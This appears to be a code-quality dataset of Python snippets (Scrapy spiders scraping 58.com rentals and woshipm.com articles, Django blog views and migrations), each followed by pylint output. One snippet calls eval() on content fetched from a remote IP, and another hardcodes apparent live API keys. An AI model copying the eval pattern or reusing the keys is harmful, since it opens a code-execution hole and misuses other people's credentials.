42       #         '//*[@itemtype=""http://schema.org/Place""][1]/text()').extract())
43   
44       #     self.log(""image_urls: %s"" % response.xpath('//*[@itemprop=""image""][1]/@src').extract())
","14 - error: syntax-error
"
"1   from datetime import datetime
2   from scrapy.spiders import SitemapSpider
3   
4   class FilteredSitemapSpider(SitemapSpider):
5       name = 'filtered_sitemap_spider'
6       allowed_domains = ['example.com']
7       sitemap_urls = ['http://example.com/sitemap.xml']
8   
9       def sitemap_filter(self, entries):
10           for entry in entries:
11               date_time = datetime.strptime(entry['lastmod'], '%Y-%m-%d')
12               if date_time.year >= 2005:
13                   yield entry","4 - refactor: too-few-public-methods
"
"1   from django import template
2   from ..models import Post
3   from django.utils.safestring import mark_safe
4   import markdown
5   from django.db.models import Count
6   register = template.Library()
7   
8   
9   @register.filter(name='markdown')
10   def markdown_fromat(text):
11       return mark_safe(markdown.markdown(text))
12   
13   @register.simple_tag
14   def total_posts():
15       return Post.published.count()
16   
17   @register.inclusion_tag('latest_posts.html')
18   def show_latest_posts(count=3):
19       latest_posts = Post.published.order_by('-publish')[:count]
20       return {'latest_posts': latest_posts} 
21   
22   
23   
24   @register.simple_tag
25   # In the preceding template tag, you build a QuerySet using the annotate() function
26   # to aggregate the total number of comments for each post. You use the Count
27   # aggregation function to store the number of comments in the computed field total_
28   # comments for each Post object. You order the QuerySet by the computed field in
29   # descending order. You also provide an optional count variable to limit the total
30   def get_most_commented_posts(count=2):
31       return Post.published.annotate(
32           total_comments=Count('comments')
33           ).order_by('-total_comments')[:count]","2 - error: relative-beyond-top-level
"
"1   from types import resolve_bases
2   import scrapy
3   from scrapy.spidermiddlewares.httperror import HttpError
4   from twisted.internet.error import DNSLookupError
5   from twisted.internet.error import TimeoutError,TCPTimedOutError
6   
7   
8   
9   class DemoSpider(scrapy.Spider):
10       name='demo'
11       start_urls=[
12           ""http://www.httpbin.org/"",              # HTTP 200 expected 
13           ""http://www.httpbin.org/status/404"",    # Webpage not found  
14           ""http://www.httpbin.org/status/500"",    # Internal server error 
15           ""http://www.httpbin.org:12345/"",        # timeout expected 
16           ""http://www.httphttpbinbin.org/"",      
17       ]
18   
19       def start_requests(self):
20           for u in self.start_urls:
21               yield scrapy.Request(u,callback=self.parse_httpbin),
22               dont_filter=True
23   
24   
25       def parse_httpbin(self, response): 
26         self.logger.info('Recieved response from {}'.format(response.url)) 
27         # ...  
28   
29   
30       def  errback_httpbin(self,failure):
31           self.logger.error(repr(failure))
32   
33           if failure.check(HttpError):
34               response=failure.value.response
35               self.logger.error('htttp Error occireed on %s',response.url)
36   
37           elif failure.check(DNSLookupError) :
38               response=failure.request
39               self.logger.error(""DNSLookupError occurred on %s"", request.url) 
40   
41           elif failure.check(TimeoutError,TCPTimedOutError):
42               request =failure.request
43               self.logger.eerror(""timeout occured on %s"",request.url)    
44    
45   
46   
47   
","26 - warning: bad-indentation
21 - refactor: trailing-comma-tuple
5 - warning: redefined-builtin
22 - warning: unused-variable
39 - error: possibly-used-before-assignment
1 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   import random
3   import requests
4   def GetIps():
5       li=[]
6       global count
7       url ='http://139.199.182.250:8000/?types=0&count=300'
8       ips=requests.get(url)
9       for ip in eval(ips.content):
10           li.append(ip[0]+':'+ip[1])
11       return li
12   
13   GetIps()
","6 - warning: global-variable-not-assigned
8 - warning: missing-timeout
9 - warning: eval-used
2 - warning: unused-import
"
"1   from django.contrib import admin
2   from .models import Products,feeds,MyModel,Post
3   # Register your models here.
4   
5   admin.site.register(Products)
6   admin.site.register(feeds)
7   admin.site.register(MyModel)
8   
9   admin.site.register(Post)
","2 - error: relative-beyond-top-level
"
"1   # import requests
2   # url = ""https://proxy-orbit1.p.rapidapi.com/v1/""
3   # headers = {
4   #     'x-rapidapi-key': ""b188eee73cmsha4c027c9ee4e2b7p1755ebjsn1e0e0b615bcf"",
5   #     'x-rapidapi-host': ""proxy-orbit1.p.rapidapi.com""
6   #     }
7   # # response = requests.request(""GET"", url, headers=headers)
8   # print(response.text)
9   
10   import requests
11   url= ""https://libraries.io/api/""
12   headers={'?api_key':'306cf1684a42e4be5ec0a1c60362c2ef',
13   # 'platform':'NPM/base62/dependent_repositories'
14   }
15   response = requests.request(""GET"", url, headers=headers)
16   print(response.text)
17   
18   
19   
20   
21   
22   Example: https://libraries.io/api/NPM/base62/dependent_repositories?api_key=306cf1684a42e4be5ec0a1c60362c2ef 
23   
24   
25   
26   
27   
28   
29   
30   
31   
32   
33   
34   import requests
35   
36   url = ""https://scrapingant.p.rapidapi.com/post""
37   
38   payload = ""{\""cookies\"": \""cookie_name_1=cookie_value_1;cookie_name_2=cookie_value_2\""\""return_text\"": false,\""url\"": \""https://example.com\""}""
39   headers = {
40       'content-type': ""application/json"",
41       'x-rapidapi-key': ""b188eee73cmsha4c027c9ee4e2b7p1755ebjsn1e0e0b615bcf"",
42       'x-rapidapi-host': ""scrapingant.p.rapidapi.com""
43       }
44   
45   response = requests.request(""POST"", url, data=payload, headers=headers)
46   
47   print(response.text)
48   
49   
","22 - error: syntax-error
"
"1   from django.db import models
2   
3   # Create your models here.
4   
5   from datetime import datetime
6   from elasticsearch_dsl import DocType, Date, Nested, Boolean, \
7       analyzer, InnerObjectWrapper, Completion, Keyword, Text, Integer
8   
9   from elasticsearch_dsl.analysis import CustomAnalyzer as _CustomAnalyzer
10   
11   from elasticsearch_dsl.connections import connections
12   connections.create_connection(hosts=[""localhost""])
13   
14   
15   class CustomAnalyzer(_CustomAnalyzer):
16       def get_analysis_definition(self):
17           return {}
18   
19   
20   ik_analyzer = CustomAnalyzer(""ik_max_word"", filter=[""lowercase""])
21   
22   
23   class ArticleType(DocType):
24       """"""
25       # elasticsearch_dsl安装5.4版本
26       """"""
27       # 文章类型
28       suggest = Completion(analyzer=ik_analyzer)
29       title = Text(analyzer=""ik_max_word"")
30       create_date = Date()
31       url = Keyword()
32       view = Integer()
33       category = Text(analyzer=""ik_max_word"")
34       content = Text(analyzer=""ik_max_word"")
35   
36       class Meta:
37           index = ""pm""
38           doc_type = ""article""
39   
40   
41   if __name__ == ""__main__"":
42       data = ArticleType.init()
43       print(data)
44   
","15 - refactor: too-few-public-methods
36 - refactor: too-few-public-methods
23 - refactor: too-few-public-methods
1 - warning: unused-import
5 - warning: unused-import
6 - warning: unused-import
6 - warning: unused-import
6 - warning: unused-import
6 - warning: unused-import
"
"1   
2   from  haystack  import  indexes 
3   from  django . conf  import  settings 
4   from  .models  import  Article ,Category ,Tag 
5   
6   
7   class  ArticleIndex ( indexes . SearchIndex ,  indexes . Indexable ): 
8       text  =  indexes . CharField ( document = True ,  use_template = True ) 
9   
10       def  get_model ( self ): 
11           return  Article 
12   
13       def  index_queryset ( self ,  using = None ): 
14           return  self . get_model (). objects . filter ( status = 'p' ) ","4 - error: relative-beyond-top-level
13 - warning: unused-argument
3 - warning: unused-import
4 - warning: unused-import
4 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   from pymongo import MongoClient
3   from scrapy import log
4   import traceback
5   from scrapy.exceptions import DropItem
6   
7   class SingleMongodbPipeline(object):
8       MONGODB_SERVER = ""101.200.46.191""
9       MONGODB_PORT = 27017
10       MONGODB_DB = ""zufang_fs""
11   
12       def __init__(self):
13           #初始化mongodb连接
14           try:
15               client = MongoClient(self.MONGODB_SERVER, self.MONGODB_PORT)
16               self.db = client[self.MONGODB_DB]
17           except Exception as e:
18               traceback.print_exc()
19   
20       @classmethod
21       def from_crawler(cls, crawler):
22           cls.MONGODB_SERVER = crawler.settings.get('SingleMONGODB_SERVER', '101.200.46.191')
23           cls.MONGODB_PORT = crawler.settings.getint('SingleMONGODB_PORT', 27017)
24           cls.MONGODB_DB = crawler.settings.get('SingleMONGODB_DB', 'zufang_fs')
25           pipe = cls()
26           pipe.crawler = crawler
27           return pipe
28   
29       def process_item(self, item, spider):
30           if item['pub_time'] == 0:
31               raise DropItem(""Duplicate item found: %s"" % item)
32           if item['method'] == 0:
33               raise DropItem(""Duplicate item found: %s"" % item)
34           if item['community']==0:
35               raise DropItem(""Duplicate item found: %s"" % item)
36           if item['money']==0:
37               raise DropItem(""Duplicate item found: %s"" % item)
38           if item['area'] == 0:
39               raise DropItem(""Duplicate item found: %s"" % item)
40           if item['city'] == 0:
41               raise DropItem(""Duplicate item found: %s"" % item)
42           # if item['phone'] == 0:
43           #     raise DropItem(""Duplicate item found: %s"" % item)
44           # if item['img1'] == 0:
45           #     raise DropItem(""Duplicate item found: %s"" % item)
46           # if item['img2'] == 0:
47           #     raise DropItem(""Duplicate item found: %s"" % item)
48           zufang_detail = {
49               'title': item.get('title'),
50               'money': item.get('money'),
51               'method': item.get('method'),
52               'area': item.get('area', ''),
53               'community': item.get('community', ''),
54               'targeturl': item.get('targeturl'),
55               'pub_time': item.get('pub_time', ''),
56               'city':item.get('city',''),
57               'phone':item.get('phone',''),
58               'img1':item.get('img1',''),
59               'img2':item.get('img2',''),
60           }
61           result = self.db['zufang_detail'].insert(zufang_detail)
62           print '[success] the '+item['targeturl']+'wrote to MongoDB database'
63           return item","62 - error: syntax-error
"
"1   # Generated by Django 3.1.3 on 2020-11-14 04:52
2   
3   from django.db import migrations, models
4   import tinymce.models
5   
6   
7   class Migration(migrations.Migration):
8   
9       dependencies = [
10           ('core', '0005_feeds_content'),
11       ]
12   
13       operations = [
14           migrations.CreateModel(
15               name='MyModel',
16               fields=[
17                   ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
18                   ('content', tinymce.models.HTMLField()),
19               ],
20           ),
21           migrations.RemoveField(
22               model_name='feeds',
23               name='content',
24           ),
25           migrations.RemoveField(
26               model_name='feeds',
27               name='description',
28           ),
29       ]
","7 - refactor: too-few-public-methods
"
"1   # Generated by Django 3.1.3 on 2020-11-13 06:20
2   
3   from django.db import migrations
4   
5   
6   class Migration(migrations.Migration):
7   
8       dependencies = [
9           ('core', '0002_products'),
10       ]
11   
12       operations = [
13           migrations.RenameModel(
14               old_name='Post',
15               new_name='feeds',
16           ),
17       ]
","6 - refactor: too-few-public-methods
"
"1   
2   from django.shortcuts import render, get_object_or_404
3   from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
4   from django.contrib.auth.models import User
5   from django.views.generic import (
6       ListView,
7       DetailView,
8       CreateView,
9       UpdateView,
10       DeleteView
11   )
12   from .models import Post, Products,MyModel,feeds
13   
14   
15   
16   
17   def home(request):
18   	
19   	context={
20   	'posts':Post.objects.all()
21   
22   	}
23   
24   	return render (request,'blog/home.html',context)
25   
26   class PostListView(ListView):
27       model = Post
28       template_name ='blog/home.html'  # <app>/<model>_<viewtype>.html
29       context_object_name ='posts'
30       ordering = ['-date_posted']
31       paginate_by = 5
32   
33   class UserPostListView(ListView):
34       model = Post
35       template_name = 'blog/user_posts.html'  # <app>/<model>_<viewtype>.html
36       context_object_name = 'posts'
37       paginate_by = 5
38   
39       def get_queryset(self):
40           user = get_object_or_404(User, username=self.kwargs.get('username'))
41           return Post.objects.filter(author=user).order_by('-date_posted')
42   
43   
44   class PostDetailView(DetailView):
45   	model=Post
46   	template_name = 'blog/post_detail.html'
47   
48   
49   class PostCreateView(LoginRequiredMixin, CreateView):
50       model = Post
51       fields = ['title', 'content','description']
52       template_name = 'blog/post_form.html'  # <app>/<model>_<viewtype>.html
53   
54   
55       def form_valid(self, form):
56           form.instance.author = self.request.user
57           return super().form_valid(form)
58   
59   
60   
61   
62   
63   class PostUpdateView(LoginRequiredMixin,UserPassesTestMixin,UpdateView):
64   
65   	model=Post
66   	fields=['title','content','description']
67   	template_name='blog/post_form.html'
68   
69   	def form_valid(self, form):
70   		form.instance.author=self.request.user
71   		return super().form_valid(form)
72   
73   	def test_func(self):
74   
75   	    post =self.get_object()
76   	    if self.request.user==post.author:
77   	     	return True
78   	    return False	
79   
80   
81   
82   class PostDeleteView(LoginRequiredMixin,UserPassesTestMixin,DeleteView):
83   
84   	model=Post
85   	success_url='/'
86   	template_name = 'blog/post_confirm_delete.html'
87   
88   
89   
90   
91   	def test_func(self):
92   
93   	    post =self.get_object()
94   	    if self.request.user==post.author:
95   	     	return True
96   	    return False	
97   
98   
99   
100   
101   
102   def index(request):
103   	fore=Products.objects.all()
104   	feed=feeds.objects.all()
105   
106   
107   
108   
109   	context={
110   	  'fore':fore,
111   	  'feed':feed
112   	}
113   
114   
115   
116   
117   	return render(request, 'index.html',context)
118   def  about(request):
119   	return render(request, 'about.html')
120   def  product(request):
121   	form =productForm(request.POST)
122   
123   	if  form.is_valid():
124   		form.save()
125   		form =productForm()
126   
127   	context={
128   	  'form':form
129   	}
130   
131   	return render(request, 'product.html',context)
132    
133   def  contact(request):
134   	feed=feeds.objects.all()
135   
136   	
137   
138   	return render(request, ""contact.html"",{'feed':feed})","19 - warning: bad-indentation
24 - warning: bad-indentation
45 - warning: bad-indentation
46 - warning: bad-indentation
65 - warning: bad-indentation
66 - warning: bad-indentation
67 - warning: bad-indentation
69 - warning: bad-indentation
70 - warning: bad-indentation
71 - warning: bad-indentation
73 - warning: bad-indentation
75 - warning: bad-indentation
76 - warning: bad-indentation
77 - warning: bad-indentation
78 - warning: bad-indentation
84 - warning: bad-indentation
85 - warning: bad-indentation
86 - warning: bad-indentation
91 - warning: bad-indentation
93 - warning: bad-indentation
94 - warning: bad-indentation
95 - warning: bad-indentation
96 - warning: bad-indentation
103 - warning: bad-indentation
104 - warning: bad-indentation
109 - warning: bad-indentation
117 - warning: bad-indentation
119 - warning: bad-indentation
121 - warning: bad-indentation
123 - warning: bad-indentation
124 - warning: bad-indentation
125 - warning: bad-indentation
127 - warning: bad-indentation
131 - warning: bad-indentation
134 - warning: bad-indentation
138 - warning: bad-indentation
12 - error: relative-beyond-top-level
26 - refactor: too-few-public-methods
33 - refactor: too-few-public-methods
44 - refactor: too-few-public-methods
49 - refactor: too-few-public-methods
82 - refactor: too-few-public-methods
121 - error: undefined-variable
125 - error: undefined-variable
12 - warning: unused-import
"
"1   # -*- coding: utf-8 -*-
2   from scrapy_redis.spiders import RedisSpider
3   from scrapy.selector import Selector
4   from tc_zufang.utils.result_parse import list_first_item
5   from scrapy.http import Request
6   from tc_zufang.utils.InsertRedis import inserintotc,inserintota
7   import re
8   defaultencoding = 'utf-8'
9   '''
10   58同城的爬虫
11   '''
12   #继承自RedisSpider，则start_urls可以从redis读取
13   #继承自BaseSpider，则start_urls需要写出来
14   class TczufangSpider(RedisSpider):
15       name='basic'
16       start_urls=(
17           'http://dg.58.com/chuzu/',
18           'http://sw.58.com/chuzu/',
19           'http://sz.58.com/chuzu/',
20           'http://gz.58.com/chuzu/',
21       #     'http://fs.58.com/chuzu/',
22       #     'http://zs.58.com/chuzu/',
23       #     'http://zh.58.com/chuzu/',
24       #     'http://huizhou.58.com/chuzu/',
25       #     'http://jm.58.com/chuzu/',
26       #     'http://st.58.com/chuzu/',
27       #     'http://zhanjiang.58.com/chuzu/',
28       #     'http://zq.58.com/chuzu/',
29       #     'http://mm.58.com/chuzu/',
30       #     'http://jy.58.com/chuzu/',
31       #     'http://mz.58.com/chuzu/',
32       #     'http://qingyuan.58.com/chuzu/',
33       #     'http://yj.58.com/chuzu/',
34       #     'http://sg.58.com/chuzu/',
35       #     'http://heyuan.58.com/chuzu/',
36       #     'http://yf.58.com/chuzu/',
37       #     'http://chaozhou.58.com/chuzu/',
38       #     'http://taishan.58.com/chuzu/',
39       #     'http://yangchun.58.com/chuzu/',
40       #     'http://sd.58.com/chuzu/',
41       #     'http://huidong.58.com/chuzu/',
42       #     'http:// boluo.58.com/chuzu/',
43       # )
44       # redis_key = 'tczufangCrawler:start_urls'
45       #解析从start_urls下载返回的页面
46       #页面页面有两个目的：
47       #第一个：解析获取下一页的地址，将下一页的地址传递给爬虫调度器，以便作为爬虫的下一次请求
48       #第二个：获取详情页地址，再对详情页进行下一步的解析
49       redis_key = 'start_urls'
50       def parse(self, response):
51           #获取所访问的地址
52           response_url=re.findall('^http\:\/\/\w+\.58\.com',response.url)
53           response_selector = Selector(response)
54           next_link=list_first_item(response_selector.xpath(u'//div[contains(@class,""pager"")]/a[contains(@class,""next"")]/@href').extract())
55           detail_link=response_selector.xpath(u'//div[contains(@class,""listBox"")]/ul[contains(@class,""listUl"")]/li/@logr').extract()
56   
57           if next_link:
58               if detail_link:
59                       # print next_link
60                   # yield Request(next_link,callback=self.parse)
61                   inserintotc(next_link, 1)
62                   print '#########[success] the next link ' + next_link + ' is insert into the redis queue#########'
63           for detail_link in response_selector.xpath(u'//div[contains(@class,""listBox"")]/ul[contains(@class,""listUl"")]/li/@logr').extract():
64                #gz_2_39755299868183_28191154595392_sortid:1486483205000 @ ses:busitime ^ desc @ pubid:5453707因为58同城的详情页做了爬取限制，所以由自己构造详情页id
65                #构造详情页url
66                  # detail_link='http://dg.58.com/zufang/'+detail_link.split('_')[3]+'x.shtml'
67               detail_link = response_url[0]+'/zufang/' + detail_link.split('_')[3] + 'x.shtml'
68                  #对详情页进行解析cd
69               if detail_link:
70                   inserintota(detail_link,2)
71                   print '[success] the detail link ' + detail_link + ' is insert into the redis queue'","16 - error: syntax-error
"
"1   import scrapy
2   
3   
4   class WebiSpider(scrapy.Spider):
5       name = 'webi'
6       allowed_domains = ['web']
7       start_urls = ['http://web/']
8   
9       def parse(self, response):
10           pass
","4 - refactor: too-few-public-methods
"
"1   from django.contrib import admin
2   from django.urls import path,include
3   from django.conf import settings
4   from django.conf.urls.static import static
5   from django.contrib.sitemaps.views import sitemap
6   from blog.sitemaps import PostSitemap
7   from django.conf.urls import url, include
8   # from .. import core
9   sitemaps={
10       'posts':PostSitemap,
11   }
12   
13   urlpatterns = [
14       path('admin/', admin.site.urls,  ),
15       path('',include('blog.urls')),
16       path('core/',include('core.urls')),
17       path('api/',include('api.urls')),
18       # path('oauth/',include('oauth.urls')), 
19       path('accounts/', include('allauth.urls')),
20       path('sitemap.xml', sitemap, {'sitemaps': sitemaps},
21       name='django.contrib.sitemaps.views.sitemap')
22       
23   
24   ] + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)","7 - warning: reimported
7 - warning: unused-import
"
"1   import scrapy  
2   class DemoSpider(scrapy.Spider): 
3      name = 'demo' 
4      start_urls = ['http://www.something.com/users/login.php']  
5      def parse(self, response): 
6         return scrapy.FormRequest.from_response( 
7            response, 
8            formdata = {'username': 'admin', 'password': 'confidential'}, 
9            callback = self.after_login 
10         )  
11      
12      def after_login(self, response): 
13         if ""authentication failed"" in response.body: 
14            self.logger.error(""Login failed"") 
15            return  
16         # You can continue scraping here","3 - warning: bad-indentation
4 - warning: bad-indentation
5 - warning: bad-indentation
6 - warning: bad-indentation
12 - warning: bad-indentation
13 - warning: bad-indentation
14 - warning: bad-indentation
15 - warning: bad-indentation
12 - refactor: useless-return
"
"1   # -*- coding: utf-8 -*-
2   import redis
3   def inserintotc(str,type):
4       try:
5           r = redis.Redis(host='127.0.0.1', port=6379, db=0)
6       except:
7           print '连接redis失败'
8       else:
9           if type == 1:
10               r.lpush('start_urls', str)
11   def inserintota(str,type):
12       try:
13           r = redis.Redis(host='127.0.0.1', port=6379, db=0)
14       except:
15           print '连接redis失败'
16       else:
17           if type == 2:
18               r.lpush('tczufang_tc:requests', str)","7 - error: syntax-error
"
"1   # -*- coding: utf-8 -*-
2   res=u'\u4e30\u6cf0\u57ce'
3   # rr=res.encode('gbk')
4   print res","4 - error: syntax-error
"
"1   
2   import hashlib
3   import datetime
4   
5   
6   def date_convert(value):
7       # 日期转化
8       try:
9           create_date = datetime.datetime.strptime(value, ""%Y/%m/%d"").date()
10       except Exception as e:
11           print(e)
12           create_date = datetime.datetime.now().date()
13   
14       return create_date
15   
16   
17   def get_md5(url):
18       # url md5加密
19       if isinstance(url, str):
20           url = url.encode(""utf-8"")
21       m = hashlib.md5()
22       m.update(url)
23       return m.hexdigest()
24   
25   
26   if __name__ == '__main__':
27       print(date_convert('2020/02/28'))
28       print(get_md5('http://www.woshipm.com/it/3443027.html'))
","10 - warning: broad-exception-caught
"
"1   # You need to create an Item name 'played' for running this script
2   # item['ack_signal'] = int(response.meta['ack_signal']) - this line is used for sending ack signal to RabbitMQ
3   def parse(self, response):
4       item = played()
5       songs = response.xpath('//li[@class=""player-in-playlist-holder""]')
6       indexr = response.url.find('date=')
7       indexr = indexr + 5
8       date = response.url[indexr:indexr + 10]
9   
10       for song in songs:
11           item['timeplayed'] = song.xpath('.//span[@class=""time""]/text()').extract()[0]
12           item['artist'] = song.xpath('.//div[@class=""jp-title""]/strong//span//text()').extract()[0]
13           item['song'] = song.xpath('.//div[@class=""jp-title""]/strong//em//text()').extract()[0]
14           item['dateplayed'] = date
15           item['ack_signal'] = int(response.meta['ack_signal'])
16           yield item","4 - error: undefined-variable
3 - warning: unused-argument
"
"1   import scrapy
2   
3   class MySpider(scrapy.Spider):
4       name = 'myspider'
5       start_urls = ['http://example.com']
6   
7       def parse(self, response):
8           print(f""Existing settings: {self.settings.attributes.keys()}"")
9   class MyExtension:
10       def __init__(self, log_is_enabled=False):
11           if log_is_enabled:
12               print(""log is enabled!"")
13   
14       @classmethod
15       def from_crawler(cls, crawler):
16           settings = crawler.settings
17           return cls(settings.getbool('LOG_ENABLED'))","7 - warning: unused-argument
3 - refactor: too-few-public-methods
9 - refactor: too-few-public-methods
"
"1   # -*- coding: utf-8 -*-
2   from scrapy_redis.spiders import RedisSpider
3   from scrapy.selector import Selector
4   from tc_zufang.utils.result_parse import list_first_item
5   from scrapy.http import Request
6   from tc_zufang.items import TcZufangItem
7   import re
8   defaultencoding = 'utf-8'
9   '''
10   58同城的爬虫
11   '''
12   #继承自RedisSpider，则start_urls可以从redis读取
13   #继承自BaseSpider，则start_urls需要写出来
14   class TczufangSpider(RedisSpider):
15       name='tczufang'
16       redis_key = 'tczufang_tc:requests'
17       #解析从start_urls下载返回的页面
18       #页面页面有两个目的：
19       #第一个：解析获取下一页的地址，将下一页的地址传递给爬虫调度器，以便作为爬虫的下一次请求
20       #第二个：获取详情页地址，再对详情页进行下一步的解析
21       #对详情页进行下一步的解析
22       def parse(self, response):
23           tczufangItem=TcZufangItem()
24           response_url = re.findall('^http\:\/\/\w+\.58\.com', response.url)
25           response_selector = Selector(response)
26           # 字段的提取可以使用在终端上scrapy shell进行调试使用
27           # 帖子名称
28           raw_title=list_first_item(response_selector.xpath(u'//div[contains(@class,""house-title"")]/h1[contains(@class,""c_333 f20"")]/text()').extract())
29           if raw_title:
30               tczufangItem['title'] =raw_title.encode('utf8')
31           #t帖子发布时间,进一步处理
32           raw_time=list_first_item(response_selector.xpath(u'//div[contains(@class,""house-title"")]/p[contains(@class,""house-update-info c_888 f12"")]/text()').extract())
33           try:
34               tczufangItem['pub_time'] =re.findall(r'\d+\-\d+\-\d+\s+\d+\:\d+\:\d+',raw_time)[0]
35           except:
36               tczufangItem['pub_time']=0
37           #租金
38           tczufangItem['money']=list_first_item(response_selector.xpath(u'//div[contains(@class,""house-pay-way f16"")]/span[contains(@class,""c_ff552e"")]/b[contains(@class,""f36"")]/text()').extract())
39           # 租赁方式
40           raw_method=list_first_item(response_selector.xpath(u'//ul[contains(@class,""f14"")]/li[1]/span[2]/text()').extract())
41           try:
42               tczufangItem['method'] =raw_method.encode('utf8')
43           except:
44               tczufangItem['method']=0
45           # 所在区域
46           try:
47               area=response_selector.xpath(u'//ul[contains(@class,""f14"")]/li/span/a[contains(@class,""c_333"")]/text()').extract()[1]
48           except:
49               area=''
50           if area:
51               area=area
52           try:
53               area2=response_selector.xpath(u'//ul[contains(@class,""f14"")]/li/span/a[contains(@class,""c_333"")]/text()').extract()[2]
54           except:
55               area2=''
56           raw_area=area+""-""+area2
57           if raw_area:
58               raw_area=raw_area.encode('utf8')
59           tczufangItem['area'] =raw_area if raw_area else None
60           # 所在小区
61           try:
62               raw_community = response_selector.xpath(u'//ul[contains(@class,""f14"")]/li/span/a[contains(@class,""c_333"")]/text()').extract()[0]
63               if raw_community:
64                   raw_community=raw_community.encode('utf8')
65               tczufangItem['community']=raw_community if raw_community else None
66           except:
67               tczufangItem['community']=0
68           # 帖子详情url
69           tczufangItem['targeturl']=response.url
70           #帖子所在城市
71           tczufangItem['city']=response.url.split(""//"")[1].split('.')[0]
72           #帖子的联系电话
73           try:
74               tczufangItem['phone']=response_selector.xpath(u'//div[contains(@class,""house-fraud-tip"")]/span[1]/em[contains(@class,""phone-num"")]/text()').extract()[0]
75           except:
76               tczufangItem['phone']=0
77           # 图片1的联系电话
78           try:
79               tczufangItem['img1'] = response_selector.xpath(u'//ul[contains(@class,""pic-list-wrap pa"")]/li[1]/@data-src').extract()[0]
80           except:
81               tczufangItem['img1'] = 0
82           # 图片1的联系电话
83           try:
84               tczufangItem['img2'] = response_selector.xpath(u'//ul[contains(@class,""pic-list-wrap pa"")]/li[2]/@data-src').extract()[0]
85           except:
86                tczufangItem['img2'] = 0
87           yield tczufangItem","86 - warning: bad-indentation
24 - warning: anomalous-backslash-in-string
24 - warning: anomalous-backslash-in-string
24 - warning: anomalous-backslash-in-string
24 - warning: anomalous-backslash-in-string
24 - warning: anomalous-backslash-in-string
24 - warning: anomalous-backslash-in-string
28 - warning: redundant-u-string-prefix
32 - warning: redundant-u-string-prefix
35 - warning: bare-except
38 - warning: redundant-u-string-prefix
40 - warning: redundant-u-string-prefix
43 - warning: bare-except
48 - warning: bare-except
47 - warning: redundant-u-string-prefix
51 - warning: self-assigning-variable
54 - warning: bare-except
53 - warning: redundant-u-string-prefix
66 - warning: bare-except
62 - warning: redundant-u-string-prefix
75 - warning: bare-except
74 - warning: redundant-u-string-prefix
80 - warning: bare-except
79 - warning: redundant-u-string-prefix
85 - warning: bare-except
84 - warning: redundant-u-string-prefix
22 - refactor: too-many-statements
24 - warning: unused-variable
14 - refactor: too-few-public-methods
5 - warning: unused-import
"
"1   # from __future__ import unicode_literals
2   # from django.utils.encoding import python_2_unicode_compatible
3   # from django.db import models
4   # from django.db.models.signals import pre_delete
5   # from django.dispatch import receiver
6   # from scrapy_djangoitem import DjangoItem
7   # from dynamic_scraper.models import Scraper, SchedulerRuntime
8   
9   
10   # @python_2_unicode_compatible
11   # class NewsWebsite(models.Model):
12   #     name = models.CharField(max_length=200)
13   #     url = models.URLField()
14   #     scraper = models.ForeignKey(Scraper, blank=True, null=True, on_delete=models.SET_NULL)
15   #     scraper_runtime = models.ForeignKey(SchedulerRuntime, blank=True, null=True, on_delete=models.SET_NULL)
16       
17   #     def __str__(self):
18   #         return self.name
19   
20   
21   # @python_2_unicode_compatible
22   # class Article(models.Model):
23   #     title = models.CharField(max_length=200)
24   #     news_website = models.ForeignKey(NewsWebsite) 
25   #     description = models.TextField(blank=True)
26   #     url = models.URLField(blank=True)
27   #     thumbnail = models.CharField(max_length=200, blank=True)
28   #     checker_runtime = models.ForeignKey(SchedulerRuntime, blank=True, null=True, on_delete=models.SET_NULL)
29       
30   #     def __str__(self):
31   #         return self.title
32   
33   
34   # class ArticleItem(DjangoItem):
35   #     django_model = Article
36   
37   
38   # @receiver(pre_delete)
39   # def pre_delete_handler(sender, instance, using, **kwargs):
40   #     if isinstance(instance, NewsWebsite):
41   #         if instance.scraper_runtime:
42   #             instance.scraper_runtime.delete()
43       
44   #     if isinstance(instance, Article):
45   #         if instance.checker_runtime:
46   #             instance.checker_runtime.delete()
47               
48   # pre_delete.connect(pre_delete_handler)","Clean Code: No Issues Detected
"
"1   # -*- coding: utf-8 -*-
2   import re
3   import json
4   import scrapy
5   import copy
6   from articles.items import PmArticlesItem
7   from articles.utils.common import date_convert
8   
9   
10   class PmSpiderSpider(scrapy.Spider):
11       name = 'pm_spider'
12       allowed_domains = ['woshipm.com']
13       # start_urls = ['http://www.woshipm.com/__api/v1/stream-list/page/1']
14       base_url = 'http://www.woshipm.com/__api/v1/stream-list/page/{}'
15   
16       def start_requests(self):
17           for i in range(1, 10):
18               url = self.base_url.format(i)
19               yield scrapy.Request(url=url, callback=self.parse)
20   
21       def parse(self, response):
22           item = PmArticlesItem()
23           # print(response.text)
24           data_set = json.loads(response.text)
25           # print(datas.get('payload'))
26           if data_set:
27               for data in data_set.get('payload'):
28                   # print(data)
29                   item[""title""] = data.get(""title"", '')
30                   item[""create_date""] = date_convert(data.get(""date"", ''))
31                   item[""url""] = data.get(""permalink"", '')
32                   # item[""content""] = data.get(""snipper"", '').replace('\n', '').replace('\r', '')
33                   item[""view""] = data.get(""view"", '')
34                   item[""tag""] = re.search(r'tag"">(.*?)<', data.get(""category"", '')).group(1)
35                   item[""url_id""] = data.get('id', '')
36                   # print(item)
37                   yield scrapy.Request(url=item[""url""], callback=self.parse_detail, meta=copy.deepcopy({'item': item}))
38   
39       def parse_detail(self, response):
40           item = response.meta['item']
41           content = response.xpath(""//div[@class='grap']//text()"").re(r'\S+')
42           item[""content""] = ''.join(content)
43           # print(item)
44           yield item
45   
","Clean Code: No Issues Detected
"
"1   # -*- coding: utf-8 -*-
2   
3   # Define here the models for your scraped items
4   #
5   # See documentation in:
6   # https://docs.scrapy.org/en/latest/topics/items.html
7   
8   import redis
9   import scrapy
10   import datetime
11   from scrapy.loader.processors import MapCompose
12   from articles.model.es_types import ArticleType
13   
14   from elasticsearch_dsl.connections import connections
15   es = connections.create_connection(ArticleType._doc_type.using)
16   
17   redis_cli = redis.StrictRedis()
18   
19   
20   def gen_suggests(index, info_tuple):
21       # 根据字符串生成搜索建议数组
22       used_words = set()
23       suggests = []
24       for text, weight in info_tuple:
25           if text:
26               # 调用es的analyze接口分析字符串
27               words = es.indices.analyze(index=index, analyzer=""ik_max_word"", params={'filter': [""lowercase""]}, body=text)
28               anylyzed_words = set([r[""token""] for r in words[""tokens""] if len(r[""token""]) > 1])
